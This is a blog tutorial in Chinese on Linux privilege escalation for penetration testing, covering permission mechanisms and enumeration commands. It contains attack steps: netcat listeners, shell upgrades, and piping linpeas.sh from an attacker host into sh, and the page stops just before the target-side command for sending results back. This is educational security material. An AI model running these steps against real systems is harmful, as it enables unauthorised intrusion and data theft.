<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://lmlsama.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://LMLsama.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-test1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/12/27/test1/" class="article-date">
  <time class="dt-published" datetime="2025-12-27T07:39:00.563Z" itemprop="datePublished">2025-12-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <ul>
<li><h1 id="Linux提权精讲：原理和枚举"><a href="#Linux提权精讲：原理和枚举" class="headerlink" title="Linux提权精讲：原理和枚举"></a>Linux提权精讲：原理和枚举</h1><h2 id="一、提权简介"><a href="#一、提权简介" class="headerlink" title="一、提权简介"></a>一、提权简介</h2><p>提权就是提升权限，源自英语<code>Privilege Escalation/PrivEsca/PE</code>它是指在渗透测试或红队行动中获得较低权限用户之后提升至更高权限用户,直至获得ROOT权限用户的过程</p>
<p>我们很难直接获得系统的最高权限（root），因为<strong>应用程序通常是按需配置权限的提权方法</strong></p>
<p>没有一劳永逸的解决方案， 因此我们不能依赖某种或几种方法解决所有问题。然而我们可以研究常规手段和一般规律，解决大部分情况</p>
<p>很大程度上取决于目标系统的配置，我们可以通过分析像内核版本；已安装的应用程序；支持的编程语言；其他用户的凭据等关键因素，找到获得ROOT的方法  </p>
<p>关键元素包括：操作系统或应用程序中的错误配置漏洞，超特权用户，弱凭据…</p>
<p>提权的重要性体现:1,重置密码；2,想绕过访问控制来提取受保护的数据；3,编辑软件配置；4,开启持久化，以便稍后可以再次访问这台计算机；5,更改现有或新建用户的用户权限；6,执行任何管理命令</p>
<h2 id="二、权限体系（安全机制）"><a href="#二、权限体系（安全机制）" class="headerlink" title="二、权限体系（安全机制）"></a>二、权限体系（安全机制）</h2><h3 id="1-常用安全机制"><a href="#1-常用安全机制" class="headerlink" title="1. 常用安全机制"></a>1. 常用安全机制</h3><ul>
<li><strong>UGO 体系</strong>：UGO 是 Linux 文件权限管理的基础，代表三种身份（U：文件所有者，G：文件的属组，O：其他人）和三种权限（r：读  4，w：写  2，x：执行  1）。</li>
</ul>
<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154715044.png" alt="img" style="zoom:67%;" />

<blockquote>
<p>chmod - change file mode bits    改变文件的权限</p>
<p>chgrp - change group ownership    改变文件所属的组</p>
<p>chown - change file owner and group    改变文件所有者</p>
</blockquote>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155622301.png" alt="image-20251125140935928"></p>
<p>​    <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9573355.html">Linux ugo 权限 - sparkdev - 博客园</a> </p>
<ul>
<li><strong>SUID&#x2F;SGID</strong>：SUID 让普通用户临时拥有文件属主的执行权限，SGID 让目录下新建文件的属组继承该目录的属组。</li>
</ul>
<p>​    <a target="_blank" rel="noopener" href="https://www.cnblogs.com/leehang/p/18995417">Linux 文件特殊权限位（SUID、SGID、Sticky Bit）的应用 - LeeHang - 博客园</a></p>
<ul>
<li><strong>Capabilities</strong>：Capabilities 机制将 root 的特权细分为多个单元，允许进程以特定的能力运行，而非给予全部 root 权限。</li>
</ul>
<p>​    <a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/11417781.html">Linux Capabilities 简介 - sparkdev - 博客园</a></p>
<ul>
<li><strong>AppArmor 和 SELinux</strong>：基于强制访问控制（MAC）策略，AppArmor 使用应用程序配置文件，SELinux 基于安全策略进行访问控制。</li>
</ul>
<p>​    <a target="_blank" rel="noopener" href="https://blog.csdn.net/ytwoshuai/article/details/147517554">Linux安全模块：SELinux与AppArmor深度解析-CSDN博客</a></p>
<ul>
<li><p><strong>ACL（访问控制列表）</strong>：ACL 是 UGO 权限管理的补充，可针对特定用户或组设置文件或目录的访问权限。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiao_yi_xiao/article/details/117735278">Linux ACL访问控制权限完全攻略（超详细）_acl权限-CSDN博客</a></p>
</li>
</ul>
<h3 id="2-不常用安全机制"><a href="#2-不常用安全机制" class="headerlink" title="2. 不常用安全机制"></a>2. 不常用安全机制</h3><p>包括 <strong>Grsecurity</strong>、<strong>Pax</strong>、<strong>ExecShield</strong>、<strong>ASLR</strong>、<strong>TOMOYO Linux</strong>、<strong>SMACK</strong>、<strong>Yama</strong>、<strong>CGroups</strong>、<strong>Linux Namespaces</strong>、<strong>StackGuard</strong>、<strong>ProPolice</strong>、<strong>seccomp</strong>、<strong>ptrace</strong>、<strong>Capsicum</strong>、<strong>Mprotect</strong>、<strong>chroot</strong> 和 <strong>firejail</strong> 等。</p>
<h2 id="三、提权原理"><a href="#三、提权原理" class="headerlink" title="三、提权原理"></a>三、提权原理</h2><h3 id="1-基于权限体系（安全机制）的利用"><a href="#1-基于权限体系（安全机制）的利用" class="headerlink" title="1. 基于权限体系（安全机制）的利用"></a>1. 基于权限体系（安全机制）的利用</h3><ul>
<li><strong>低权限修改可执行文件或脚本</strong>：如果低权限用户可以修改以高权限运行的可执行文件或脚本，就可以通过植入恶意代码获取高权限。UGO-RWX+S</li>
<li><strong>利用 SUID&#x2F;SGID</strong>：查找具有 SUID&#x2F;SGID 权限的二进制文件，若存在漏洞或配置错误，可用于提权。</li>
<li><strong>利用 Capabilities</strong>：检查进程是否具有特定的能力，如 <code>CAP_SYS_ADMIN</code>、<code>CAP_DAC_OVERRIDE</code> 等，利用这些能力进行提权。</li>
</ul>
<h3 id="2-基于用户行为的利用"><a href="#2-基于用户行为的利用" class="headerlink" title="2. 基于用户行为的利用"></a>2. 基于用户行为的利用</h3><ul>
<li><strong>运维人员凭据泄露</strong>：低权限用户可能在使用高权限账户时，因备份或记录需要，将凭据保存在可访问的位置。如vim日志文件，断电之后的交换文件里面会有敏感信息</li>
</ul>
<h3 id="3-内存和-CPU-层面"><a href="#3-内存和-CPU-层面" class="headerlink" title="3.内存和 CPU 层面"></a>3.内存和 CPU 层面</h3><ul>
<li><strong>内存和 CPU 层面的凭据捕捉</strong>：在权限体系的上层，攻击者可能在内存和 CPU 层面拦截，捕捉，或是修改凭据信息。如：基于内存去读取一些敏感信息来实现内核利用</li>
</ul>
<h2 id="四、提权枚举"><a href="#四、提权枚举" class="headerlink" title="四、提权枚举"></a>四、提权枚举</h2><p>提权枚举是提权过程中的关键步骤，不管是初始权限还是root权限    目的是收集系统和网络的信息，寻找可能的提权路径。</p>
<p>一般，把获得初始立足点（初始shell&#x2F;权限用户）之前叫<strong>侦查</strong>&#x2F;信息收集，目的是撕口子，获得初始立足点</p>
<p>获得初始立足点之后，为了提权，横向，渗透 打内网的信息收集叫<strong>枚举</strong>。枚举比侦察有常规方法，收集的信息内容&#x2F;使用的工具&#x2F;命令 更明确</p>
<h3 id="1-升级命令行提示符-也叫终端升级（精）"><a href="#1-升级命令行提示符-也叫终端升级（精）" class="headerlink" title="1. 升级命令行提示符 &#x2F; 也叫终端升级（精）"></a>1. 升级命令行提示符 &#x2F; 也叫终端升级（精）</h3><p>在获得初始 Shell 后，通常需要升级到一个更完整、更稳定、交互性更强的命令行环境。 即：将我们的shell升级为完整的tty</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;	#最重要</span><br><span class="line">stty raw -echo</span><br><span class="line">export TERM=xterm-color		#TERM环境变量未设置  								#这三条命令可以提高shell交互性</span><br><span class="line"></span><br><span class="line">rlwrap nc -lvnp 443		#终端连接前加 rlwrap 这个工具可以便于上下翻找历史记录</span><br></pre></td></tr></table></figure>

<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154714603.png" alt="image-20251213193106998" style="zoom:80%;" />

<h3 id="2-手工枚举（最重要，最前）"><a href="#2-手工枚举（最重要，最前）" class="headerlink" title="2. 手工枚举（最重要，最前）"></a>2. 手工枚举（最重要，最前）</h3><h4 id="2-1-枚举用户和系统信息"><a href="#2-1-枚举用户和系统信息" class="headerlink" title="2.1 枚举用户和系统信息"></a>2.1 枚举用户和系统信息</h4><ul>
<li><p><strong>用户信息</strong>：</p>
<ul>
<li><code>whoami</code>：当前用户。</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155629488.png" alt="image-20251124204549218"></p>
<ul>
<li><code>id</code>：当前用户 UID、GID 和所属组。</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155638968.png" alt="image-20251124204603416"></p>
<blockquote>
<p>[!CAUTION]</p>
<p><strong><code>lxd</code></strong>：这是<strong>最关键的组</strong>，因为 LXD 是 Linux 容器管理工具，<strong>属于 <code>lxd</code> 组的用户可以创建和管理容器</strong>，并且<strong>默认可以挂载宿主机的文件系统</strong>，从而可能实现  <strong>容器逃逸 + 权限提升</strong>。</p>
</blockquote>
<ul>
<li><code>who</code>：当前登录的用户和相关信息（Linux是一个多用户系统，可以看除了当前用户还有哪些用户登陆了当前系统）可以显示登陆时间，终端类型</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154714602.png" alt="image-20251124204758722"></p>
<ul>
<li><code>w</code>：当前登录用户的详细信息，包括他们在做什么，及系统的负载信息；从哪个IP访问的，登陆时间，闲置时间，CPU的状态。</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154715570.png" alt="image-20251124205033428"></p>
<ul>
<li><code>last</code>：系统最近的登录记录。（有暴露内核版本）</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154715886.png" alt="image-20251124205111416"></p>
</li>
<li><p><strong>系统和内核信息</strong>：</p>
<ul>
<li><code>uname -a</code>：内核版本。</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155644434.png" alt="image-20251124205406761"></p>
<ul>
<li><code>lsb_release -a</code>（需下载）：发行版信息。<code>cat /etc/os-release</code></li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154715950.png" alt="image-20251124210107540"></p>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155703749.png" alt="image-20251125144107865"></p>
<ul>
<li><code>cat /proc/version</code>：查看进程信息，获取内核和系统版本。</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155758133.png" alt="image-20251124210214865"></p>
<ul>
<li><code>cat /etc/issue</code>：系统版本。</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154716366.png" alt="image-20251124210254448"></p>
<ul>
<li><p><code>hostname/hostnamectl</code>：主机名和系统信息。</p>
<p>1.标识他，这台机器叫什么名字    2.提供这台机器在网络中的角色(SQL的服务器：可能叫:sql account&#x2F;bill&#x2F;order)</p>
<p>便于在信息枚举&#x2F;收集过程中定位他的角色，排出数据的优先级和重要性</p>
</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154716590.png" alt="image-20251124211902915"></p>
</li>
<li><p><strong>网络信息</strong>：</p>
<ul>
<li><p><code>ip addr</code> 或 <code>ifconfig</code>：IP 地址和网卡信息。    <code>ifconfig</code>是旧版过时的命令，如果机器比较老，可能只支持这个</p>
<blockquote>
<p>网卡信息：拿到一个shell之后，如果有多张网卡，配合着路由信息去看，可以发现内网更多信息  <strong>IPv6</strong></p>
</blockquote>
</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155716928.png" alt="image-20251124210435026"></p>
<ul>
<li><code>ip route</code>：查看路由表信息。</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155712971.png" alt="image-20251124210608534"></p>
<ul>
<li><code>ip neigh</code>（查看网络邻居，内网比较有价值。） 或 <code>arp -a</code>（arp缓存，内网横向渗透常见）：可以看到局域网 IP 和 MAC 地址绑定关系。</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154716794.png" alt="image-20251124210703713"></p>
<blockquote>
<p> <strong>OU 就是 MAC 地址里的“厂商身份证”，<code>00:50:56:\*</code> 一出现，说明这台机器是 VMware 虚拟化出来的。</strong></p>
<table>
<thead>
<tr>
<th>字段</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>192.168.168.2</code> &#x2F; <code>192.168.168.254</code></td>
<td>邻居的 IP 地址</td>
</tr>
<tr>
<td><code>dev ens33</code></td>
<td>本机通过哪块网卡学到</td>
</tr>
<tr>
<td><code>lladdr 00:50:56:...</code></td>
<td>对方的 <strong>MAC 地址</strong></td>
</tr>
<tr>
<td><code>REACHABLE</code></td>
<td>近期验证过，<strong>可直接通信</strong></td>
</tr>
<tr>
<td><code>STALE</code></td>
<td>超过验证时间，<strong>下次发送前会先 ARP 确认</strong></td>
</tr>
</tbody></table>
</blockquote>
</li>
</ul>
<h4 id="2-2-枚举文件和进程"><a href="#2-2-枚举文件和进程" class="headerlink" title="2.2 枚举文件和进程"></a>2.2 枚举文件和进程</h4><ul>
<li><p><strong>文件和目录</strong>：</p>
<ul>
<li><code>ls -a</code> 或 <code>ls -liah</code>：查看<strong>隐藏文件</strong>和详细信息。</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154716867.png" alt="image-20251124213426391"></p>
<table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>-l</code></td>
<td>长格式（权限、硬链接数、属主、属组、大小、时间、名字）</td>
</tr>
<tr>
<td><code>-i</code></td>
<td>显示 <strong>inode 号</strong>（文件系统里唯一标识）</td>
</tr>
<tr>
<td><code>-a</code></td>
<td>显示 <strong>所有</strong> 文件，包括以 <code>.</code> 开头的隐藏文件</td>
</tr>
<tr>
<td><code>-h</code></td>
<td>人类可读大小（K、M、G）</td>
</tr>
</tbody></table>
<ul>
<li><code>cat /etc/passwd</code>：系统用户信息。</li>
</ul>
<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154717057.png" alt="image-20251124214100796" style="zoom: 33%;" />

<table>
<thead>
<tr>
<th>字段序号</th>
<th>名称</th>
<th>含义说明</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>用户名</td>
<td>登录系统时使用的名称，如 <code>root</code>、<code>jack</code></td>
</tr>
<tr>
<td>2</td>
<td>密码占位符</td>
<td>早期存加密密码，现在统一为 <code>x</code>，<strong>真实密码在 <code>/etc/shadow</code></strong></td>
</tr>
<tr>
<td>3</td>
<td>UID</td>
<td>用户 ID，<code>0</code> 表示 root，普通用户从 <code>1000</code> 开始</td>
</tr>
<tr>
<td>4</td>
<td>GID</td>
<td>主组 ID，对应 <code>/etc/group</code> 中的组</td>
</tr>
<tr>
<td>5</td>
<td>描述信息（GECOS）</td>
<td>可选，通常为用户全名、联系方式等，可用 <code>chfn</code> 修改</td>
</tr>
<tr>
<td>6</td>
<td>家目录</td>
<td>用户登录后的默认工作目录，如 <code>/home/jack</code></td>
</tr>
<tr>
<td>7</td>
<td>登录 Shell</td>
<td>用户登录后默认启动的 shell，如 <code>/bin/bash</code>，若为 <code>/usr/sbin/nologin</code> 则无法登录</td>
</tr>
</tbody></table>
<p>有<strong>家目录</strong>，很可能是活跃用户，价值↑    最后一个是否有**&#x2F;bin&#x2F;bash**，有了价值↑</p>
<ul>
<li><code>ls -liah /etc/shadow</code>看shadow文件是否全局可读，如果可读，可以尝试hash碰撞</li>
</ul>
<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155803886.png" alt="image-20251126192544697" style="zoom: 67%;" />

<ul>
<li><code>cat /etc/crontab</code>：系统定时&#x2F;自动任务。</li>
</ul>
<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154717458.png" alt="image-20251124214606446" style="zoom:50%;" />

<p>看自动任务的格式和权限，考虑能不能写反弹shell的提权</p>
<ul>
<li><code>echo $PATH</code> 和 <code>env</code>：环境变量路径的查看，看看有没有特殊的路径。做基于路径的提权利用的时候，可以追加或在前面附上想让他优先读取的路径</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155515939.png" alt="image-20251124214956647"></p>
<ul>
<li><code>find / -perm -u=s -type f 2&gt;/dev/null</code>：查找 SUID 文件。查看有S位的可执行文件</li>
</ul>
<table>
<thead>
<tr>
<th>片段</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>find</code></td>
<td>查找文件</td>
</tr>
<tr>
<td><code>/</code></td>
<td>从根目录开始递归搜整个文件系统</td>
</tr>
<tr>
<td><code>-perm -u=s</code></td>
<td>匹配 <strong>用户位</strong> 设置了 <strong>SUID</strong> 的文件（<code>-</code> 表示“至少”该位）</td>
</tr>
<tr>
<td><code>-type f</code></td>
<td>只列出普通文件，排除目录、链接等</td>
</tr>
<tr>
<td><code>2&gt;/dev/null</code></td>
<td>把“权限拒绝”等错误信息扔进黑洞，屏幕只保留结果</td>
</tr>
<tr>
<td><code>perm</code></td>
<td>就是 <strong>permission</strong> 的缩写，告诉 <code>find</code> “按权限位过滤文件”。</td>
</tr>
</tbody></table>
<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154717724.png" alt="image-20251125194041330" style="zoom:50%;" />

<ul>
<li><code>history</code>：列出历史操作记录（尤其是对于密码枚举操作的命令一定要查看，很可能会提示你，比如是否有特权 ）</li>
</ul>
<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155733119.png" alt="image-20251124213829673" style="zoom:67%;" />

<ul>
<li><code>which</code>：查询可执行文件，不管是系统自带还是下载的（看看机器装没装一些可能有用的程序，只显示第一次的查找结果，比如awk许多目录都有安装）</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154718408.png" alt="image-20251125194304760"></p>
<table>
<thead>
<tr>
<th>工具</th>
<th>一句话作用</th>
</tr>
</thead>
<tbody><tr>
<td><strong>awk</strong></td>
<td>按列&#x2F;模式切文本，<strong>“行列都能算”</strong>&#x7684;轻量数据库。</td>
</tr>
<tr>
<td><strong>perl</strong></td>
<td><strong>超级脚本胶水</strong>，正则、网络、二进制一把梭，老派黑客最爱。</td>
</tr>
<tr>
<td><strong>python</strong></td>
<td>现世代渗透第一语言，库多、跨平台、写马快。</td>
</tr>
<tr>
<td><strong>ruby</strong></td>
<td>Metasploit 母语，写 exploit 脚本短平快。</td>
</tr>
<tr>
<td><strong>gcc</strong></td>
<td>把 C&#x2F;C++ 源码变可执行文件，<strong>内核 exploit 必备</strong>。</td>
</tr>
<tr>
<td><strong>vi&#x2F;vim</strong></td>
<td>服务器必存编辑器，<strong>“没图形也能改代码”</strong>。</td>
</tr>
<tr>
<td><strong>nmap</strong></td>
<td><strong>端口扫描代名词</strong>，扫段、OS 探、NSE 脚本一条龙。</td>
</tr>
<tr>
<td><strong>find</strong></td>
<td><strong>“按名、按权、按时间”</strong>&#x6279;量找文件，提权枚举神器。</td>
</tr>
<tr>
<td><strong>netcat &#x2F; nc</strong></td>
<td><strong>“网络瑞士军刀”</strong>，正&#x2F;反向 Shell、传文件、端口监听全靠它。</td>
</tr>
<tr>
<td><strong>wget</strong></td>
<td>命令行下载器，<strong>“一句话拉马”</strong>&#x6807;配。</td>
</tr>
<tr>
<td><strong>tftp</strong></td>
<td>轻量 UDP 文件传输，<strong>内网无认证秒传马</strong>。</td>
</tr>
<tr>
<td><strong>ftp</strong></td>
<td>经典交互文件协议，<strong>旧机维持通道</strong>常用。</td>
</tr>
<tr>
<td><strong>tmux &#x2F; screen</strong></td>
<td><strong>“断网不断 Shell”</strong>&#x7684;多路复用，反弹 Shell 长驻后台。</td>
</tr>
</tbody></table>
</li>
</ul>
<p><strong>awk 切，perl 胶，python 写马，gcc 编；nmap 扫，find 搜，nc 弹 Shell，wget 拉；tmux 保活，vi 改，内网再用 tftp 快。</strong></p>
<ul>
<li><p><strong>进程信息</strong>：</p>
<ul>
<li><code>ps -ef/-A</code> （e是全部 f是列表格式）或 <code>ps aux</code>：查看全部进程。（u是启动进程的用户，x是没有连接到终端的进程）</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154718601.png" alt="image-20251124215039681"></p>
<ul>
<li><code>ps axjf</code>：进程树。（x是没有连接到终端的进程）</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154718667.png" alt="image-20251124215241352"></p>
<table>
<thead>
<tr>
<th>字段名</th>
<th>含义说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>PPID</strong></td>
<td>Parent Process ID，<strong>父进程 ID</strong></td>
</tr>
<tr>
<td><strong>PID</strong></td>
<td>Process ID，<strong>当前进程 ID</strong></td>
</tr>
<tr>
<td><strong>PGID</strong></td>
<td>Process Group ID，<strong>进程组 ID</strong>（用于信号批量发送）</td>
</tr>
<tr>
<td><strong>SID</strong></td>
<td>Session ID，<strong>会话 ID</strong>（通常等于会话首领的 PID）</td>
</tr>
<tr>
<td><strong>TTY</strong></td>
<td>控制终端，<strong>?</strong> 表示没有终端（后台进程）</td>
</tr>
<tr>
<td><strong>TPGID</strong></td>
<td>终端前台进程组 ID，<strong>-1</strong> 表示没有终端</td>
</tr>
<tr>
<td><strong>STAT</strong></td>
<td>进程状态，如 <code>S</code>（睡眠）、<code>R</code>（运行）、<code>Z</code>（僵尸）等</td>
</tr>
<tr>
<td><strong>UID</strong></td>
<td>运行该进程的用户 ID</td>
</tr>
<tr>
<td><strong>TIME</strong></td>
<td>累计占用的 CPU 时间</td>
</tr>
<tr>
<td><strong>COMMAND</strong></td>
<td>启动命令（包含参数，树形缩进显示父子关系）</td>
</tr>
</tbody></table>
<ul>
<li><code>top -n 1</code>：实时进程信息。</li>
</ul>
</li>
</ul>
<h4 id="2-3-枚举网络和挂载"><a href="#2-3-枚举网络和挂载" class="headerlink" title="2.3 枚举网络和挂载"></a>2.3 枚举网络和挂载</h4><p>知道进程后的使用</p>
<ul>
<li><p><strong>网络连接</strong>：</p>
<ul>
<li><code>netstat -a</code> （-at是TCP  -au是UDP）或 <code>netstat -ano</code>（all    不解析名称    计时器timer）：显示所有网络连接和端口。</li>
</ul>
<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154718853.png" alt="image-20251125193909901" style="zoom:67%;" />

<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154718856.png" alt="image-20251124215958644" style="zoom:67%;" />

<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155740272.png" alt="image-20251124220043378" style="zoom:67%;" />

<p><code>netstat -l</code>：正在监听的端口</p>
<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154719277.png" alt="image-20251124220117965" style="zoom:67%;" />
</li>
<li><p><strong>挂载信息</strong>：</p>
<ul>
<li><code>cat /etc/fstab</code>：检测未挂载的硬盘和配置。（运维人员做快照&#x2F;备份时，会用另一块磁盘临时挂载上，运行后就“未挂载状态”。里面可能存在运维人员使用的备份，或敏感信息）</li>
</ul>
</li>
</ul>
<h4 id="2-4-枚举当前用户权限"><a href="#2-4-枚举当前用户权限" class="headerlink" title="2.4 枚举当前用户权限"></a>2.4 枚举当前用户权限</h4><ul>
<li><code>sudo -l</code>查看当前用户有哪些以root身份执行的 <strong>（非常重要）</strong></li>
</ul>
<blockquote>
<p>比如这里列出了mysql是可以无需密码的利用root权限执行的</p>
</blockquote>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154719615.png" alt="image-20251124212531732"></p>
<ul>
<li><p><strong>capabilities</strong></p>
<ul>
<li><code>getcap -r / 2&gt;/dev/null</code>    查看“得到权限能力”根目录下的所有文件</li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154719770.png" alt="image-20251124213251483"></p>
</li>
</ul>
<h3 id="3-自动化枚举工具"><a href="#3-自动化枚举工具" class="headerlink" title="3. 自动化枚举工具"></a>3. 自动化枚举工具</h3><p>优点：简单，速度快，信息全    不足：需要搬运文件，会产生流量或流量特征；结果很长冗余；难以针对化（如果对各段了解不深入）</p>
<p>自动化工具可以快速扫描系统，发现潜在的提权漏洞。</p>
<blockquote>
<p>[!CAUTION]</p>
<p>要看目标机器上豆安装了什么应用；系统版本…可能设有关键词屏蔽，一个不行另一个</p>
</blockquote>
<ul>
<li><p><strong>PEASS-ng（linpeas.sh）</strong>：（最新，最常用，支持MAC OS &#x2F;Linux &#x2F;Windows）    一般四五分钟，十分钟之内</p>
<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155746810.png" alt="image-20251125195605364" style="zoom:50%;" />

<ul>
<li><p>功能强大，输出详细。</p>
</li>
<li><p>支持openSSL加密，和base64的加密，如果需要绕过，免杀会有一定的效果</p>
</li>
<li><p>使用方法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#一般方法，会在本地留下文件和痕迹</span></span><br><span class="line">wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</span><br><span class="line"><span class="built_in">chmod</span> +x linpeas.sh</span><br><span class="line">./linpeas.sh	<span class="comment">#执行</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#linpeas官方推荐最佳实践，管道符给到sh执行linpeas的脚本，最大的好处是直接在线下载，直接执行，并不在本地存有任何文件</span></span><br><span class="line">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh </span><br></pre></td></tr></table></figure>

<p>扫描结果非常多，要具备手动枚举能力才能读懂</p>
<blockquote>
<ul>
<li><strong>红&#x2F;黄</strong>：95% 概率是提权向量（RED 必看，Yellow 提醒）。</li>
<li><strong>浅青</strong>：拥有控制台登录权限的用户。</li>
<li><strong>蓝</strong>：无控制台用户 &amp; 已挂载设备。</li>
<li><strong>绿</strong>：常规项（用户、组、SUID&#x2F;SGID、挂载点、.sh 脚本、cron）。</li>
<li><strong>浅洋红</strong>：当前运行 LinPEAS 的用户名（你自己）。</li>
</ul>
</blockquote>
<img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227155752179.png" alt="image-20251125200430660" style="zoom:67%;" />





<blockquote>
<p>[!NOTE]</p>
<p>假设靶机<strong>不能联网</strong>，如何利用linpeas</p>
</blockquote>
<p>现在kali用python3开启web服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 -m http.server 80</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154720117.png" alt="image-20251125201334255"></p>
<p>​    靶机中</p>
<p>​    </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl kaliip/linpeas.sh | sh</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154720403.png" alt="image-20251125201442699"></p>
<p>将结果传回本地阅读（因为有的靶机阅读不一定方便，还要对结果进行分析）</p>
<p><strong>kali</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 -m http.server 80</span><br><span class="line"><span class="built_in">sudo</span> nc -lvnp 81 | <span class="built_in">tee</span> linpeas.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20251227154720550.png" alt="image-20251125201822766"></p>
<p><strong>靶机</strong></p>
